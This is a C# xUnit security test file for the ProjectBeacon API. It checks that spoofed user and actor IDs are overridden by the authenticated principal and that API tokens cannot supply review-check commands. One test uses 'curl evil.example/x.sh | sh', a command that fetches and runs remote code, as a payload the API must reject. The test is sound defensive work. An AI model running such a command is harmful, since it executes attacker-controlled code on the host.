namespace ProjectBeacon.API.Tests;
using Application.Persistence;
using System.Net;
using System.Net.Http.Headers;
using System.Net.Http.Json;
using System.Text.Json;
using Application.Devices;
using Domain.Entities.Devices;
using Domain.Entities.Evals;
using Domain.Entities.Identity;
using Domain.Entities.Projects;
using Domain.Enums;
using Infrastructure.Data;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;

[Collection("api-http")]
public sealed class P0SecurityHttpTests
{
    private static readonly JsonSerializerOptions Json = new() { PropertyNameCaseInsensitive = true };

    [Fact]
    public async Task Logout_WithoutAuth_Returns401()
    {
        await using var factory = new AuthApiFactory();
        var client = factory.CreateClient();

        var response = await client.PostAsJsonAsync("/v1/auth/logout", new { });
        Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
    }

    [Fact]
    public async Task AddComment_SpoofedUserId_UsesPrincipal()
    {
        await using var factory = new AuthApiFactory();
        var client = factory.CreateClient();
        var jwt = await BootstrapAndLogin(client);
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", jwt);

        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me");
        var realUserId = me.GetProperty("id").GetGuid();

        var org = await PostJson(client, "/v1/orgs", new { name = "Org" });
        var orgId = org.GetProperty("id").GetGuid();
        var project = await PostJson(client, "/v1/projects", new { name = "P", orgId });
        var projectId = project.GetProperty("id").GetGuid();
        var task = await PostJson(client, $"/v1/projects/{projectId}/tasks", new
        {
            title = "sec-test",
            projectId,
            priority = 1,
            type = 3
        });
        var taskId = task.GetProperty("id").GetGuid();

        var spoofedId = Guid.NewGuid();
        var comment = await client.PostAsJsonAsync($"/v1/projects/{projectId}/tasks/{taskId}/comments", new
        {
            taskId,
            content = "spoofoo",
            userId = spoofedId
        });
        Assert.True(comment.IsSuccessStatusCode, await comment.Content.ReadAsStringAsync());

        await using var scope = factory.Services.CreateAsyncScope();
        var db = scope.ServiceProvider.GetRequiredService<BeaconDbContext>();
        using (TenantScope.EnterUnscoped())
        {
            var stored = await db.TaskComments
                .FirstOrDefaultAsync(c => c.TaskId == taskId && c.Content == "spoofoo");
            Assert.NotNull(stored);
            Assert.Equal(realUserId, stored.UserId);
            Assert.NotEqual(spoofedId, stored.UserId);
        }
    }

    [Fact]
    public async Task CreateTask_SpoofedActorUserId_Ignored()
    {
        await using var factory = new AuthApiFactory();
        var client = factory.CreateClient();
        var jwt = await BootstrapAndLogin(client);
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", jwt);

        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me");
        var realUserId = me.GetProperty("id").GetGuid();

        var org = await PostJson(client, "/v1/orgs", new { name = "Org" });
        var orgId = org.GetProperty("id").GetGuid();
        var project = await PostJson(client, "/v1/projects", new { name = "P", orgId });
        var projectId = project.GetProperty("id").GetGuid();

        var spoofedActor = Guid.NewGuid();
        var response = await client.PostAsJsonAsync($"/v1/projects/{projectId}/tasks", new
        {
            title = "spoofoo-task",
            projectId,
            priority = 1,
            type = 3,
            actorUserId = spoofedActor
        });
        Assert.True(response.IsSuccessStatusCode, await response.Content.ReadAsStringAsync());

        var body = await response.Content.ReadFromJsonAsync<JsonElement>(Json);
        var taskId = body.GetProperty("id").GetGuid();
        Assert.NotEqual(Guid.Empty, taskId);
    }

    [Fact]
    public async Task FinishWork_SpoofedActorId_UsesPrincipal()
    {
        await using var factory = new AuthApiFactory();
        var client = factory.CreateClient();
        var jwt = await BootstrapAndLogin(client);
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", jwt);

        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me");
        var realUserId = me.GetProperty("id").GetGuid();

        var org = await PostJson(client, "/v1/orgs", new { name = "Org" });
        var orgId = org.GetProperty("id").GetGuid();
        var project = await PostJson(client, "/v1/projects", new { name = "P", orgId });
        var projectId = project.GetProperty("id").GetGuid();
        var task = await PostJson(client, $"/v1/projects/{projectId}/tasks", new
        {
            title = "fw-test",
            projectId,
            priority = 1,
            type = 3
        });
        var taskId = task.GetProperty("id").GetGuid();

        var spoofedActor = Guid.NewGuid().ToString();
        Guid proofId;
        await using (var seed = factory.Services.CreateAsyncScope())
        {
            var seedDb = seed.ServiceProvider.GetRequiredService<BeaconDbContext>();
            using (TenantScope.EnterUnscoped())
            {
                var proof = ReviewRun.Start(projectId, taskId, Domain.Enums.ReviewerType.Agent, Guid.NewGuid());
                proof.Complete("checked", "check:spoof");
                proofId = proof.Id;
                seedDb.ReviewRuns.Add(proof);
                await seedDb.SaveChangesAsync();
            }
        }

        var response = await client.PostAsJsonAsync("/v1/work/finish_work", new
        {
            taskId = taskId.ToString(),
            result = "done",
            output = "spoofoo output",
            actorId = spoofedActor,
            review = new { reviewerRun = true, regressionsFound = 0, regressionsFixed = 0 },
            reviewRunId = proofId
        });
        Assert.True(response.IsSuccessStatusCode, await response.Content.ReadAsStringAsync());

        await using var scope = factory.Services.CreateAsyncScope();
        var db = scope.ServiceProvider.GetRequiredService<BeaconDbContext>();
        using (TenantScope.EnterUnscoped())
        {
            var entity = await db.Tasks.FindAsync([taskId]);
            Assert.NotNull(entity);
            Assert.Equal(Domain.Enums.TaskItemStatus.Done, entity.Status);

            var comment = await db.TaskComments
                .FirstOrDefaultAsync(c => c.TaskId == taskId && c.Content.Contains("Work finished"));
            Assert.NotNull(comment);
            Assert.Equal(realUserId, comment.UserId);
        }
    }

    [Fact]
    public async Task CreateToken_CreatedByDerivedFromPrincipal()
    {
        await using var factory = new AuthApiFactory();
        var client = factory.CreateClient();
        var jwt = await BootstrapAndLogin(client);
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", jwt);

        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me");
        var realUserId = me.GetProperty("id").GetGuid();

        var org = await PostJson(client, "/v1/orgs", new { name = "Org" });
        var orgId = org.GetProperty("id").GetGuid();
        var project = await PostJson(client, "/v1/projects", new { name = "P", orgId });
        var projectId = project.GetProperty("id").GetGuid();

        var token = await PostJson(client, $"/v1/projects/{projectId}/tokens", new
        {
            projectId,
            name = "sec-token",
            capabilities = 1
        });
        var tokenId = token.GetProperty("id").GetGuid();

        await using var scope = factory.Services.CreateAsyncScope();
        var db = scope.ServiceProvider.GetRequiredService<BeaconDbContext>();
        using (TenantScope.EnterUnscoped())
        {
            var stored = await db.ApiTokens.FindAsync([tokenId]);
            Assert.NotNull(stored);
            Assert.Equal(realUserId, stored.CreatedByUserId);
        }
    }

    [Fact]
    public async Task CreateOrg_SpoofedCreatedByUserId_Ignored()
    {
        await using var factory = new AuthApiFactory();
        var client = factory.CreateClient();
        var jwt = await BootstrapAndLogin(client);
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", jwt);

        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me");
        var realUserId = me.GetProperty("id").GetGuid();

        var spoofedId = Guid.NewGuid();
        var org = await PostJson(client, "/v1/orgs", new { name = "SpoofOrg", createdByUserId = spoofedId });
        var orgId = org.GetProperty("id").GetGuid();

        await using var scope = factory.Services.CreateAsyncScope();
        var db = scope.ServiceProvider.GetRequiredService<BeaconDbContext>();
        using (TenantScope.EnterUnscoped())
        {
            var member = await db.OrgMembers.FirstOrDefaultAsync(m => m.OrgId == orgId);
            Assert.NotNull(member);
            Assert.Equal(realUserId, member.UserId);
            Assert.NotEqual(spoofedId, member.UserId);
        }
    }

    [Fact]
    public async Task CreateProject_SpoofedCreatedByUserId_Ignored()
    {
        await using var factory = new AuthApiFactory();
        var client = factory.CreateClient();
        var jwt = await BootstrapAndLogin(client);
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", jwt);

        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me");
        var realUserId = me.GetProperty("id").GetGuid();

        var org = await PostJson(client, "/v1/orgs", new { name = "Org2" });
        var orgId = org.GetProperty("id").GetGuid();

        var spoofedId = Guid.NewGuid();
        var project = await PostJson(client, "/v1/projects", new { name = "SpoofProj", orgId, createdByUserId = spoofedId });
        var projectId = project.GetProperty("id").GetGuid();

        await using var scope = factory.Services.CreateAsyncScope();
        var db = scope.ServiceProvider.GetRequiredService<BeaconDbContext>();
        using (TenantScope.EnterUnscoped())
        {
            var member = await db.ProjectMembers.FirstOrDefaultAsync(m => m.ProjectId == projectId);
            Assert.NotNull(member);
            Assert.Equal(realUserId, member.UserId);
            Assert.NotEqual(spoofedId, member.UserId);
        }
    }

    [Fact]
    public async Task CreateToken_SpoofedCreatedByUserId_Ignored()
    {
        await using var factory = new AuthApiFactory();
        var client = factory.CreateClient();
        var jwt = await BootstrapAndLogin(client);
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", jwt);

        var me = await client.GetFromJsonAsync<JsonElement>("/v1/auth/me");
        var realUserId = me.GetProperty("id").GetGuid();

        var org = await PostJson(client, "/v1/orgs", new { name = "Org3" });
        var orgId = org.GetProperty("id").GetGuid();
        var project = await PostJson(client, "/v1/projects", new { name = "P3", orgId });
        var projectId = project.GetProperty("id").GetGuid();

        var spoofedId = Guid.NewGuid();
        var token = await PostJson(client, $"/v1/projects/{projectId}/tokens", new
        {
            projectId,
            name = "spoof-token",
            capabilities = 1,
            createdByUserId = spoofedId
        });
        var tokenId = token.GetProperty("id").GetGuid();

        await using var scope = factory.Services.CreateAsyncScope();
        var db = scope.ServiceProvider.GetRequiredService<BeaconDbContext>();
        using (TenantScope.EnterUnscoped())
        {
            var stored = await db.ApiTokens.FindAsync([tokenId]);
            Assert.NotNull(stored);
            Assert.Equal(realUserId, stored.CreatedByUserId);
            Assert.NotEqual(spoofedId, stored.CreatedByUserId);
        }
    }

    [Fact]
    public async Task ReviewCheck_Token_SuppliedCommand_Rejected400()
    {
        await using var factory = new AuthApiFactory();
        var client = factory.CreateClient();
        var jwt = await BootstrapAndLogin(client);
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", jwt);

        var org = await PostJson(client, "/v1/orgs", new { name = "Org" });
        var orgId = org.GetProperty("id").GetGuid();
        var project = await PostJson(client, "/v1/projects", new { name = "P", orgId });
        var projectId = project.GetProperty("id").GetGuid();
        var task = await PostJson(client, $"/v1/projects/{projectId}/tasks", new
        {
            title = "rc-test",
            projectId,
            priority = 1,
            type = 3
        });
        var taskId = task.GetProperty("id").GetGuid();

        // TaskWrite token created by the admin: the token actor carries the creator's UserId,
        // so it passes the endpoint guard and reaches the handler.
        var token = await PostJson(client, $"/v1/projects/{projectId}/tokens", new
        {
            projectId,
            name = "rc-token",
            capabilities = 2
        });
        var rawToken = token.GetProperty("token").GetString()!;
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", rawToken);

        var response = await client.PostAsJsonAsync($"/v1/tasks/{taskId}/pipeline/review/check", new
        {
            taskId,
            deviceId = Guid.NewGuid(),
            checkCommand = "curl evil.example/x.sh | sh"
        });

        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
    }

    [Fact]
    public async Task ReviewCheck_Token_ProjectCommand_Honored200()
    {
        await using var factory = new AuthApiFactory();
        var client = factory.CreateClient();
        var jwt = await BootstrapAndLogin(client);
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", jwt);

        var org = await PostJson(client, "/v1/orgs", new { name = "Org" });
        var orgId = org.GetProperty("id").GetGuid();
        var project = await PostJson(client, "/v1/projects", new { name = "P", orgId });
        var projectId = project.GetProperty("id").GetGuid();
        var task = await PostJson(client, $"/v1/projects/{projectId}/tasks", new
        {
            title = "rc-trust-test",
            projectId,
            priority = 1,
            type = 3
        });
        var taskId = task.GetProperty("id").GetGuid();

        // Set the trusted review command via the admin user
        var setResp = await client.PutAsJsonAsync("/v1/projects/" + projectId, new
        {
            projectId,
            name = project.GetProperty("name").GetString(),
            description = project.GetProperty("description").GetString(),
            reviewCheckCommand = "dotnet test"
        });
        var setBody = await setResp.Content.ReadFromJsonAsync<JsonElement>(Json);
        Assert.True(setResp.IsSuccessStatusCode, setBody.ToString());

        // Seed a device, heartbeat, runtime, and open review run via the DB
        Guid deviceId;
        using (var seed = factory.Services.CreateAsyncScope())
        {
            var seedDb = seed.ServiceProvider.GetRequiredService<BeaconDbContext>();
            var factorySvc = seed.ServiceProvider.GetRequiredService<IBeaconDbFactory>();
            var adminUser = seedDb.Users.First(u => u.IsAdmin);
            using (TenantScope.EnterUnscoped())
            {
                var device = DaemonDevice.Create("rc-device", adminUser.Id, "fp-trust", "hash", "bcd_test");
                seedDb.DaemonDevices.Add(device);

                var run = ReviewRun.Start(projectId, taskId, ReviewerType.Agent, Guid.NewGuid(), "agent-xyz");
                seedDb.ReviewRuns.Add(run);
                await seedDb.SaveChangesAsync();
                deviceId = device.Id;
            }

            // Simulate heartbeat so the device is "online"
            var heartbeat = new HeartbeatDeviceCommand(
                new HeartbeatDeviceRequest(deviceId, "{}", "{}"));
            var beat = await new HeartbeatDeviceHandler(factorySvc).HandleAsync(heartbeat);
            if (!beat.Success) throw new InvalidOperationException("Heartbeat failed: " + beat.Error);

            // Attach runtime
            var runtime = new AttachRuntimeCommand(
                new AttachRuntimeRequest(projectId, deviceId, adminUser.Id, @"A:\work\rc"));
            var attach = await new AttachRuntimeHandler(factorySvc).HandleAsync(runtime);
            if (!attach.Success) throw new InvalidOperationException("Runtime attach failed: " + attach.Error);
        }

        // TaskWrite token with empty body: should resolve from project.ReviewCheckCommand → success
        var tokenResp = await PostJson(client, $"/v1/projects/{projectId}/tokens", new
        {
            projectId,
            name = "rc-trust-token",
            capabilities = 2
        });
        var rawToken = tokenResp.GetProperty("token").GetString()!;
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", rawToken);

        var response = await client.PostAsJsonAsync($"/v1/tasks/{taskId}/pipeline/review/check", new
        {
            taskId,
            deviceId = deviceId.ToString()
        });

        if (response.StatusCode != HttpStatusCode.OK)
        {
            var body = await response.Content.ReadAsStringAsync();
            Assert.Fail($"Expected 200, got {response.StatusCode}. Body: {body}");
        }
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
    }

    [Fact]
    public async Task ReviewCheck_Token_EmptyBody_PassesValidation()
    {
        // A token with an empty body reaches validation but then fails at device lookup.
        // This confirms the token's empty body is NOT rejected at the body-command check
        // (i.e. body-validation gate is not blocking), so the failure is expectedly
        // due to the missing device — confirming the validation gate passed for empty body.
        await using var factory = new AuthApiFactory();
        var client = factory.CreateClient();
        var jwt = await BootstrapAndLogin(client);
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", jwt);

        var org = await PostJson(client, "/v1/orgs", new { name = "Org" });
        var orgId = org.GetProperty("id").GetGuid();
        var project = await PostJson(client, "/v1/projects", new { name = "P", orgId });
        var projectId = project.GetProperty("id").GetGuid();
        var task = await PostJson(client, $"/v1/projects/{projectId}/tasks", new
        {
            title = "rc-empty-body-test",
            projectId,
            priority = 1,
            type = 3
        });
        var taskId = task.GetProperty("id").GetGuid();

        // Token with empty body — should NOT return 400 (that would mean body validation blocked it).
        // A non-400 response confirms the body-validation gate passed for the empty body.
        var token = await PostJson(client, $"/v1/projects/{projectId}/tokens", new
        {
            projectId,
            name = "rc-empty-token",
            capabilities = 2
        });
        var rawToken = token.GetProperty("token").GetString()!;
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", rawToken);

        var response = await client.PostAsJsonAsync($"/v1/tasks/{taskId}/pipeline/review/check", new
        {
            taskId,
            deviceId = Guid.NewGuid()
        });

        // Device not found (404/400 from enqueue) — not a body-validation 400.
        // The key assertion: it is NOT "Check command is required" or
        // "API tokens may not supply a check command" — those are 400s from body validation.
        var body = await response.Content.ReadAsStringAsync();
        var errorJson = System.Text.Json.JsonSerializer.Deserialize<System.Text.Json.JsonElement>(body);
        var problemDetailType = errorJson.GetProperty("type").GetString();
        var title = errorJson.TryGetProperty("title", out var titleProp) ? titleProp.GetString() : null;

        // If we get a 400, it must be from device not found, not body validation
        if (response.StatusCode == System.Net.HttpStatusCode.BadRequest)
        {
            Assert.False(title?.Contains("Check command", StringComparison.OrdinalIgnoreCase),
                "Should not reject empty body: " + title);
        }
    }

    private static async Task<string> BootstrapAndLogin(HttpClient client)
    {
        var bootRequest = new HttpRequestMessage(HttpMethod.Post, "/v1/auth/bootstrap");
        bootRequest.Content = JsonContent.Create(new { });
        bootRequest.Headers.Authorization = new AuthenticationHeaderValue("Bearer", AuthApiFactory.BootstrapToken);
        var boot = await client.SendAsync(bootRequest);
        boot.EnsureSuccessStatusCode();
        var bootJson = await boot.Content.ReadFromJsonAsync<JsonElement>(Json);
        var password = bootJson.GetProperty("password").GetString();
        var login = await client.PostAsJsonAsync("/v1/auth/login", new { login = "admin", password });
        login.EnsureSuccessStatusCode();
        var loginJson = await login.Content.ReadFromJsonAsync<JsonElement>(Json);
        return loginJson.GetProperty("token").GetString()!;
    }

    private static async Task<JsonElement> PostJson(HttpClient client, string url, object body)
    {
        var response = await client.PostAsJsonAsync(url, body);
        var text = await response.Content.ReadAsStringAsync();
        Assert.True(response.IsSuccessStatusCode, $"{url} {response.StatusCode} {text}");
        return JsonSerializer.Deserialize<JsonElement>(text, Json);
    }
}
